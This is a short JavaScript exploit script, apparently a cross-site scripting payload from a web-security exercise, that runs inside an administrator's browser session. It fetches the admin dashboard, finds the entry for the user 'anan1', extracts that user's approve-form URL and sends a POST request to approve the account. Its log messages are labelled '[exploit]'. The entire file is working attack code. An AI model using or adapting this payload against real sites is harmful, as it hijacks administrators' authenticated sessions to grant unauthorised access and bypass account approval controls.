// approve_anan.js
(async () => {
  const TARGET_USERNAME = 'anan1';

  // fetch the admin dashboard HTML
  const r = await fetch('/admin/dashboard', { credentials: 'same-origin' });
  const html = await r.text();

  // parse it
  const doc = new DOMParser().parseFromString(html, 'text/html');

  // find the <li> that contains your username
  const li = Array.from(doc.querySelectorAll('li'))
    .find(el => el.textContent.includes(TARGET_USERNAME));

  if (!li) return console.error('[exploit] user not found');

  // extract the approve form
  const form = li.querySelector('form[action^="/admin/approve"]');
  if (!form) return console.error('[exploit] approve form not found');

  const action = form.getAttribute('action'); // e.g. /admin/approve/UUID

  // send the POST to approve just that user
  const approveResp = await fetch(action, {
    method: 'POST',
    credentials: 'same-origin'
  });

  console.log('[exploit] approve status', approveResp.status);
})();
